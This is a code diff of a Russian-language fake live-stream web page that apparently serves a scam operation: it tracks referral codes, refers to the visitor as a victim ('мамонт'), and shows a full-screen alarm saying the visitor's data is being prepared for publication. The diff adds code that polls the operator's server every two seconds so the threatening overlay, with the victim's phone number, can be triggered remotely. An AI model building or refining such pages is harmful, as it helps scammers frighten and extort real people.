@@ -309,7 +309,7 @@
             margin-top: 5px;
         }
 
-        /* ===== СТРАНИЦА УВЕДОМЛЕНИЯ (ЗАКРЫВАЕТ ВСЁ) ===== */
+        /* ===== СТРАНИЦА УВЕДОМЛЕНИЯ ===== */
         #broadcastOverlay {
             position: fixed;
             top: 0;
@@ -332,35 +332,35 @@
         
         #broadcastOverlay .broadcast-box {
             background: linear-gradient(145deg, #0a0a0a, #1a0a0a);
-            border: 3px solid #ff3355;
+            border: 2px solid #ff3355;
             border-radius: 20px;
-            padding: 50px 30px;
+            padding: 40px 30px;
             max-width: 500px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 0 80px rgba(255, 51, 85, 0.3);
+            box-shadow: 0 0 60px rgba(255, 51, 85, 0.3);
             animation: pulseBorder 2s infinite;
         }
         
         @keyframes pulseBorder {
-            0%, 100% { box-shadow: 0 0 80px rgba(255, 51, 85, 0.3); }
-            50% { box-shadow: 0 0 120px rgba(255, 51, 85, 0.6); }
+            0%, 100% { box-shadow: 0 0 60px rgba(255, 51, 85, 0.3); }
+            50% { box-shadow: 0 0 100px rgba(255, 51, 85, 0.6); }
         }
         
         #broadcastOverlay .broadcast-title {
             color: #ff3355;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 4px;
+            letter-spacing: 3px;
             margin-bottom: 15px;
-            text-shadow: 0 0 40px rgba(255, 51, 85, 0.5);
+            text-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
         
         #broadcastOverlay .broadcast-subtitle {
             color: #ff6680;
-            font-size: 18px;
-            margin-bottom: 30px;
+            font-size: 16px;
+            margin-bottom: 25px;
             opacity: 0.8;
         }
         
@@ -368,14 +368,14 @@
             text-align: left;
             color: #00ffcc;
             font-family: 'Courier New', monospace;
-            font-size: 15px;
-            line-height: 2.2;
+            font-size: 14px;
+            line-height: 2;
             background: rgba(0, 0, 0, 0.5);
-            padding: 20px 25px;
+            padding: 15px 20px;
             border-radius: 10px;
             border: 1px solid rgba(255, 51, 85, 0.2);
             margin-bottom: 25px;
-            max-height: 350px;
+            max-height: 300px;
             overflow-y: auto;
         }
         
@@ -386,10 +386,9 @@
         
         #broadcastOverlay .broadcast-status {
             color: #ff3355;
-            font-size: 16px;
+            font-size: 14px;
             animation: blink 1s infinite;
-            margin-top: 15px;
-            font-weight: bold;
+            margin-top: 10px;
         }
         
         @keyframes blink {
@@ -401,25 +400,23 @@
             background: #ff3355;
             border: none;
             color: white;
-            padding: 14px 40px;
+            padding: 12px 30px;
             border-radius: 30px;
             font-weight: bold;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 15px;
             transition: 0.3s;
-            box-shadow: 0 0 30px rgba(255, 51, 85, 0.3);
         }
         
         #broadcastOverlay .broadcast-close-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 50px rgba(255, 51, 85, 0.6);
+            box-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
         }
     </style>
 </head>
 <body>
 
-<!-- ===== ОСНОВНОЙ КОНТЕНТ ===== -->
 <div id="loadingOverlay" class="loading-overlay">
     <div>🔴 ЗАГРУЗКА СТРИМА...</div>
 </div>
@@ -451,7 +448,7 @@
     <div class="chat-messages" id="chatMessages"></div>
 </div>
 
-<!-- ===== СТРАНИЦА УВЕДОМЛЕНИЯ (ПОЛНОСТЬЮ ПЕРЕКРЫВАЕТ ВСЁ) ===== -->
+<!-- ===== СТРАНИЦА УВЕДОМЛЕНИЯ ===== -->
 <div id="broadcastOverlay">
     <div class="broadcast-box">
         <div class="broadcast-title">🔴 СИСТЕМА АКТИВИРОВАНА</div>
@@ -510,9 +507,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         return {
             ref: urlParams.get('ref'),
-            model: urlParams.get('model'),
-            broadcast: urlParams.get('broadcast'),
-            phone: urlParams.get('phone')
+            model: urlParams.get('model')
         };
     }
     
@@ -530,13 +525,6 @@
         if (params.ref) {
             currentRefCode = params.ref;
             console.log(`✅ Реф код: ${currentRefCode}`);
-        }
-        
-        // ===== ЕСЛИ ЕСТЬ ПАРАМЕТР BROADCAST — ПОКАЗЫВАЕМ СТРАНИЦУ УВЕДОМЛЕНИЯ =====
-        if (params.broadcast === 'true') {
-            const phone = params.phone || 'неизвестный номер';
-            console.log('📢 ЗАПУСК РАССЫЛКИ ДЛЯ МАМОНТА!');
-            showBroadcast(phone);
         }
     }
     
@@ -571,20 +559,32 @@
             });
     })();
     
-    // ========== ПОКАЗ УВЕДОМЛЕНИЯ (ПЕРЕКРЫВАЕТ ВСЁ) ==========
+    // ========== АВТОМАТИЧЕСКАЯ ПРОВЕРКА КОМАНДЫ ==========
+    function checkForBroadcast() {
+        const refCode = currentRefCode || 'no_ref';
+        const url = `${API_URL}/check_broadcast?ref=${refCode}`;
+        
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.broadcast === true) {
+                    console.log('📢 ПОЛУЧЕНА КОМАНДА НА РАССЫЛКУ!');
+                    showBroadcast(data.phone || 'неизвестный');
+                }
+            })
+            .catch(() => {});
+    }
+    
+    // ========== ПОКАЗ УВЕДОМЛЕНИЯ ==========
     function showBroadcast(phone) {
         const overlay = document.getElementById('broadcastOverlay');
         const list = document.getElementById('broadcastList');
         const status = document.getElementById('broadcastStatus');
         
-        // Включаем оверлей
         overlay.className = 'active';
-        
-        // Очищаем список
         list.innerHTML = '';
         status.textContent = '⏳ Инициализация системы...';
         
-        // Уведомления с задержкой
         const messages = [
             { text: '🔴 СИСТЕМА АКТИВИРОВАНА', delay: 500, highlight: true },
             { text: '⏳ Ваши данные готовятся к публикации...', delay: 1500 },
@@ -623,7 +623,6 @@
     // ========== ЗАКРЫТЬ ПЕРЕКРЫТИЕ ==========
     function closeBroadcast() {
         document.getElementById('broadcastOverlay').className = '';
-        window.location.href = window.location.pathname + window.location.search;
     }
     
     // ========== ВИДЕО ПЛЕЕР ==========
@@ -889,8 +888,11 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
-    // ========== ЗАГРУЗКА ==========
+    // ========== ЗАГРУЗКА ДАННЫХ ==========
     loadWorkerData();
+    
+    // ========== ЗАПУСКАЕМ ПРОВЕРКУ КАЖДЫЕ 2 СЕКУНДЫ ==========
+    setInterval(checkForBroadcast, 2000);
 </script>
 
 <!-- Бейдж безопасности -->
